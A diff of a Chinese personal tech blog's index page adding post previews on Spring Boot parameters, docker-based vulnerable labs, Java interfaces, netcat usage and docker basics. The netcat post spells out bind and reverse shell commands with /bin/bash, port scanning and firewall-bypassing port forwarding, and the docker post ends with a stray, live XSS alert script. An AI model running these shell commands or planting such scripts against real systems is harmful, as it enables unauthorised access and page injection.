@@ -138,28 +138,529 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-java/spring-schdule" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-java/springboot接收参数" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/19/java/spring-schdule/">spring-schdule</a>
+      <a class="article-title" href="/2019/02/22/java/springboot接收参数/">springboot Controller 接收参数</a>
     </h1>
   
 
         
-        <a href="/2018/11/19/java/spring-schdule/" class="archive-article-date">
-  	<time datetime="2018-11-19T03:18:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-19</time>
+        <a href="/2019/02/22/java/springboot接收参数/" class="archive-article-date">
+  	<time datetime="2019-02-22T02:34:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-22</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4 id="1-Schduled注解"><a href="#1-Schduled注解" class="headerlink" title="1.@Schduled注解"></a>1.@Schduled注解</h4><p>配置完后，在方法上加@Scheduled(“定时表达式”)</p>
-<h4 id="2-实现ScheduingConfigurer接口"><a href="#2-实现ScheduingConfigurer接口" class="headerlink" title="2.实现ScheduingConfigurer接口"></a>2.实现ScheduingConfigurer接口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">@Lazy(false)</span><br><span class="line">@EnableScheduling</span><br><span class="line">@Component</span><br><span class="line">public class DynamicScheduledTask implements SchedulingConfigurer &#123;</span><br><span class="line"></span><br><span class="line">	@Value(&quot;$&#123;abc.call-cron&#125;&quot;)</span><br><span class="line">	private String callCron;</span><br><span class="line"></span><br><span class="line">  //重写configureTasks</span><br><span class="line">	@Override</span><br><span class="line">	public void configureTasks(ScheduledTaskRegistrar taskRegistrar) &#123;</span><br><span class="line">		if(!&quot;0&quot;.equals(callCron))&#123;</span><br><span class="line">			taskRegistrar.addTriggerTask(new Runnable() &#123;</span><br><span class="line">				@Override</span><br><span class="line">				public void run() &#123;</span><br><span class="line">					//doSomething</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;, new Trigger() &#123;</span><br><span class="line"></span><br><span class="line">				@Override</span><br><span class="line">				public Date nextExecutionTime(TriggerContext triggerContext) &#123;</span><br><span class="line">          //定时器触发，callCron为定时表达式</span><br><span class="line">					CronTrigger trigger = new CronTrigger(callCron);</span><br><span class="line">					Date nextExecDate = trigger.nextExecutionTime(triggerContext);</span><br><span class="line">					return nextExecDate;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h4 id="一-原因"><a href="#一-原因" class="headerlink" title="一.原因"></a>一.原因</h4><p>一直对springboot前后端交互的传参接参浑浑噩噩，准备仔细梳理一下。</p>
+<h4 id="二-常见注解"><a href="#二-常见注解" class="headerlink" title="二.常见注解"></a>二.常见注解</h4><h6 id="1-PathVariable"><a href="#1-PathVariable" class="headerlink" title="1.@PathVariable"></a>1.@PathVariable</h6><p>用于Get请求<br><br>获取请求url中的值，一般用来接收url/{param}类型的参数<br><br>一般返回类型为json或页面跳转等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get1/123</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get1/&#123;param&#125;&quot;,method = RequestMethod.GET)</span><br><span class="line">public String  get1(@PathVariable(&quot;param&quot;) String param)&#123;</span><br><span class="line">    System.out.println(param);</span><br><span class="line">    return param;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h6 id="2-RequestParam"><a href="#2-RequestParam" class="headerlink" title="2.@RequestParam"></a>2.@RequestParam</h6><p>用于Get/Post都行<br><br>在get请求时  获取请求参数中的值<br><br>参数一般为url后面的param=param(&amp;xx=xx)或者form-data<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get2?param1=param1&amp;param2=param2</span><br><span class="line">@ResponseBody</span><br><span class="line">    @RequestMapping(value = &quot;/get2&quot;, method = RequestMethod.GET)</span><br><span class="line">    public String get2(@RequestParam(&quot;param1&quot;) String param1,</span><br><span class="line">                       @RequestParam(&quot;param2&quot;) String param2)&#123;</span><br><span class="line">        return param1 + param2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<h6 id="3-RequestBody"><a href="#3-RequestBody" class="headerlink" title="3.@RequestBody"></a>3.@RequestBody</h6><p>用于Get/Post都行<br><br>该注解和@RequestParam殊途同归，我们使用该注解将所有参数转换，在代码部分在一个个取出来，也是目前我使用到最多的注解来获取参数<br><br>@RequestBody注解常用来处理content-type不是默认的application/x-www-form-urlcoded编码的内容，比如说：application/json或者是application/xml等。一般情况下来说常用其来处理application/json类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求url: http://127.0.0.1:8080/get3</span><br><span class="line">//参数为json: &#123;&quot;param1&quot;:&quot;11&quot;,&quot;param2&quot;: &quot;22&quot;&#125;</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get3&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get3(@RequestBody Map&lt;String,String&gt; param)&#123;</span><br><span class="line">    return param.get(&quot;param1&quot;) + param.get(&quot;param2&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h6 id="4-HttpServletRequest"><a href="#4-HttpServletRequest" class="headerlink" title="4.HttpServletRequest"></a>4.HttpServletRequest</h6><p>get或post<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br>form-data会解析为param=param&amp;xx=xx形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//请求参数为: http://127.0.0.1:8080/get4?param1=11&amp;param2=22</span><br><span class="line">//或参数为form-data</span><br><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get4&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get4(HttpServletRequest request) &#123;</span><br><span class="line">    return request.getParameter(&quot;param1&quot;)+request.getParameter(&quot;param2&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h6 id="5-直接获取"><a href="#5-直接获取" class="headerlink" title="5.直接获取"></a>5.直接获取</h6><p>get请求<br><br>适用于param=param(&amp;xx=xx)或者form-data<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@ResponseBody</span><br><span class="line">@RequestMapping(value = &quot;/get5&quot;, method = RequestMethod.GET)</span><br><span class="line">public String get4(String param1, String param2) &#123;</span><br><span class="line">    return param1+param2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>######</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/02/22/java/springboot接收参数/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-tools/docker_vulner_install" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/14/tools/docker_vulner_install/">docker搭建漏洞环境</a>
+    </h1>
+  
+
+        
+        <a href="/2019/02/14/tools/docker_vulner_install/" class="archive-article-date">
+  	<time datetime="2019-02-14T03:53:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="1-docker-compose"><a href="#1-docker-compose" class="headerlink" title="1.docker-compose"></a>1.docker-compose</h4><p>pip install docker-compose<br><br>Compose 项目是 Docker 官方的开源项目，负责实现对 Docker 容器集群的快速编排,负责快速的部署分布式应用。</p>
+<h4 id="2-git"><a href="#2-git" class="headerlink" title="2.git"></a>2.git</h4><p>git clone <a href="https://github.com/c0ny1/vulstudy.git" target="_blank" rel="noopener">https://github.com/c0ny1/vulstudy.git</a></p>
+<h4 id="3-start"><a href="#3-start" class="headerlink" title="3.start"></a>3.start</h4><h6 id="1-单独运行一个漏洞平台"><a href="#1-单独运行一个漏洞平台" class="headerlink" title="1.单独运行一个漏洞平台"></a>1.单独运行一个漏洞平台</h6><p>cd到要运行的漏洞平台下运行以下命令<br></p>
+<p>cd vulstudy/DVWA<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>
+<h6 id="2-同时运行所有漏洞平台"><a href="#2-同时运行所有漏洞平台" class="headerlink" title="2.同时运行所有漏洞平台"></a>2.同时运行所有漏洞平台</h6><p>在项目根目录下运行以下命令<br></p>
+<p>cd vulstudy<br><br>docker-compose up -d #启动容器<br><br>docker-compose stop #停止容器<br></p>
+<h5 id="3-查看信息"><a href="#3-查看信息" class="headerlink" title="3.查看信息"></a>3.查看信息</h5><p>docker-compose ps 查看启动信息<br><br>docker-compose logs 查看日志<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps  </span><br><span class="line">sudo docker exec  -it 9a8(容器id前三位) /bin/sh&lt;br&gt;</span><br><span class="line">进入容器查看/修改</span><br></pre></td></tr></table></figure></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">docker</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/02/14/tools/docker_vulner_install/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-java/interface" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/21/java/interface/">接口</a>
+    </h1>
+  
+
+        
+        <a href="/2019/01/21/java/interface/" class="archive-article-date">
+  	<time datetime="2019-01-21T06:26:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a href="https://blog.csdn.net/u010466329/article/details/78133282" target="_blank" rel="noopener">接口与抽象类区别</a></p>
+<h3 id="一-例子"><a href="#一-例子" class="headerlink" title="一.例子"></a>一.例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package base.interfacedemo;</span><br><span class="line"></span><br><span class="line">//定义一个接口</span><br><span class="line">interface TestInterface &#123;</span><br><span class="line"></span><br><span class="line">    void test();</span><br><span class="line"></span><br><span class="line">    //接口静态内部类实现 默认 public static final</span><br><span class="line">    //方便扩展</span><br><span class="line">    TestInterface Demo1 = new TestInterface() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void test() &#123;</span><br><span class="line">            System.out.println(&quot;test1&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    //default方法 java8新特性</span><br><span class="line">    default void Demo3()&#123;</span><br><span class="line">       System.out.println(&quot;test3&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//正常的接口实现</span><br><span class="line">class Demo2 implements TestInterface&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void test()&#123;</span><br><span class="line">        System.out.println(&quot;test2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class DemoInterface&#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        TestInterface.Demo1.test();</span><br><span class="line">        new Demo2().test();</span><br><span class="line">        Demo2 demo3 = new Demo2();</span><br><span class="line">        demo3.Demo3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/01/21/java/interface/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-security/netcat" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/17/security/netcat/">netcat</a>
+    </h1>
+  
+
+        
+        <a href="/2019/01/17/security/netcat/" class="archive-article-date">
+  	<time datetime="2019-01-17T07:19:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>netcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。</p>
+<h4 id="1-常用参数："><a href="#1-常用参数：" class="headerlink" title="1.常用参数："></a>1.常用参数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-4/6 使用IPv4/6地址</span><br><span class="line">-b 允许broadcast广播</span><br><span class="line">-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending</span><br><span class="line">-d 不尝试读取stdin</span><br><span class="line">-I length 设置TCP接收的buffer的大小</span><br><span class="line">-i interval 设置发送和接收间的延迟秒数，</span><br><span class="line">-l 监听模式</span><br><span class="line">-n 直接使用ip,不通过域名服务器DNS查询域名</span><br><span class="line">-o length  设置TCP发送的buffer大小</span><br><span class="line">-P 代理名字</span><br><span class="line">-p nc使用的端口</span><br><span class="line">-v verbose更多输出信息</span><br><span class="line">-w timeout</span><br><span class="line">-u 使用UDP</span><br><span class="line">-r 随机选择端口</span><br><span class="line">-s source  设置本地主机送出数据包的IP地址</span><br></pre></td></tr></table></figure>
+<h4 id="2-使用例子"><a href="#2-使用例子" class="headerlink" title="2.使用例子"></a>2.使用例子</h4><h5 id="1-建立连接，聊天"><a href="#1-建立连接，聊天" class="headerlink" title="1.建立连接，聊天"></a>1.建立连接，聊天</h5><pre><code>nc -l port 在本地主机监听一个端口&lt;br&gt;
+nc ip port 在其它主机与之建立连接（默认TCP），发送消息
+</code></pre><h5 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h5><pre><code>原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到&lt;br&gt;
+nc -v -n -z ip port(可以是范围)&lt;br&gt;
+    -v进行详细输出&lt;br&gt;
+    -n不进行域名查询&lt;br&gt;
+    -z建立连接后关闭连接，不进行数据交换&lt;br&gt;
+</code></pre><h5 id="3-数据传输-甚至可以传输流媒体）"><a href="#3-数据传输-甚至可以传输流媒体）" class="headerlink" title="3.数据传输(甚至可以传输流媒体）"></a>3.数据传输(甚至可以传输流媒体）</h5><pre><code>类似于聊天，只是将输入换成文件，使用重定向或者管道符&lt;br&gt;
+server:  nc -l port &lt; file1.txt&lt;br&gt;
+clien: nc -n ip port &gt; file2txt&lt;br&gt;
+file1往file2传数据&lt;br&gt;
+</code></pre><h5 id="4-获取shell，正反向shell"><a href="#4-获取shell，正反向shell" class="headerlink" title="4.获取shell，正反向shell"></a>4.获取shell，正反向shell</h5><pre><code>如果有-e参数，直接 nc ip port -e /bin/bash&lt;br&gt;
+无-e参数时:&lt;br&gt;
+server:&lt;br&gt;
+mkfifo /tmp/fifo&lt;br&gt;
+cat /tmp/fifo | /bin/bash -i 2&gt;&amp;1 | nc -l port &gt; /tmp/fifo&lt;br&gt;
+client:&lt;br&gt;
+nc ip port&lt;br&gt;
+原理：&lt;br&gt;
+bash -i 进入交互模式&lt;br&gt;
+通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环
+</code></pre><h5 id="5-端口转发"><a href="#5-端口转发" class="headerlink" title="5.端口转发"></a>5.端口转发</h5><pre><code>- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。
+- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。
+原理：&lt;br&gt;
+在102上：nc -l 8000&lt;br&gt;
+              cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo
+在103上：&lt;br&gt;
+        nc 192.168.1.102 9000&lt;br&gt;
+在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口
+</code></pre>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/01/17/security/netcat/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-tools/docker" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/16/tools/docker/">docker</a>
+    </h1>
+  
+
+        
+        <a href="/2019/01/16/tools/docker/" class="archive-article-date">
+  	<time datetime="2019-01-16T09:25:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>docker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br><br>镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。</p>
+<h4 id="一-install"><a href="#一-install" class="headerlink" title="一.install"></a>一.install</h4><p>ubuntu 16.04 LTS<br></p>
+<h5 id="1-sudo-apt-install-docker-io"><a href="#1-sudo-apt-install-docker-io" class="headerlink" title="1.sudo apt install docker.io"></a>1.sudo apt install docker.io</h5><h5 id="2-阿里镜像加速"><a href="#2-阿里镜像加速" class="headerlink" title="2.阿里镜像加速"></a>2.阿里镜像加速</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://etuznpiq.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+<p>保存为sh,执行</p>
+<h5 id="3-重启"><a href="#3-重启" class="headerlink" title="3.重启"></a>3.重启</h5><p>servie docker restart</p>
+<h5 id="4-登录"><a href="#4-登录" class="headerlink" title="4.登录"></a>4.登录</h5><p>sudo docker login –username=17888824094 registry.cn-hangzhou.aliyuncs.com</p>
+<h5 id="5-拉取远程镜像"><a href="#5-拉取远程镜像" class="headerlink" title="5.拉取远程镜像"></a>5.拉取远程镜像</h5><p>sudo docker pull microsoft/aci-helloworld</p>
+<h5 id="6-启动"><a href="#6-启动" class="headerlink" title="6.启动"></a>6.启动</h5><p>这是启动镜像<br><br>docker run  镜像 (-d deamon模式)<br><br>例: docker run -d -p 8888:80 microsoft/aci-helloworld<br><br>-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br><br>目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www</p>
+<h5 id="7-查看"><a href="#7-查看" class="headerlink" title="7.查看"></a>7.查看</h5><p>docker ps 查看容器信息<br><br>docker logs 容器id   查看容器内日志</p>
+<h5 id="8-关闭"><a href="#8-关闭" class="headerlink" title="8.关闭"></a>8.关闭</h5><p>这是操作的容器<br><br>docker stop 容器id<br><br>docker ps -a  查看关闭的容器<br><br>docker restart 容器id    重启容器<br><br>docker rm 容器id  删除容器</p>
+<h5 id="9-进入container"><a href="#9-进入container" class="headerlink" title="9.进入container"></a>9.进入container</h5><p>sudo docker exec  -it 9a8(容器id前三位) /bin/sh<br><br>交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作</p>
+<h5 id="10-保存对容器的修改"><a href="#10-保存对容器的修改" class="headerlink" title="10.保存对容器的修改"></a>10.保存对容器的修改</h5><p>对容器的修改默认是保存的<br><br>docker commit 698 name(生成一个新的版本名)</p>
+<h5 id="11-生成自己的image"><a href="#11-生成自己的image" class="headerlink" title="11.生成自己的image"></a>11.生成自己的image</h5><p>&lt;scr<script>ipt&gt;alert(“XSS”);&lt;/scr<script>ipt&gt;</p>
+</script></p>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">tools</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">docker</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/01/16/tools/docker/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-tools/vim" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/16/tools/vim/">vim</a>
+    </h1>
+  
+
+        
+        <a href="/2019/01/16/tools/vim/" class="archive-article-date">
+  	<time datetime="2019-01-16T06:10:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">tools</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/01/16/tools/vim/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-wheels/java/hashutil" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/15/wheels/java/hashutil/">hashutil</a>
+    </h1>
+  
+
+        
+        <a href="/2019/01/15/wheels/java/hashutil/" class="archive-article-date">
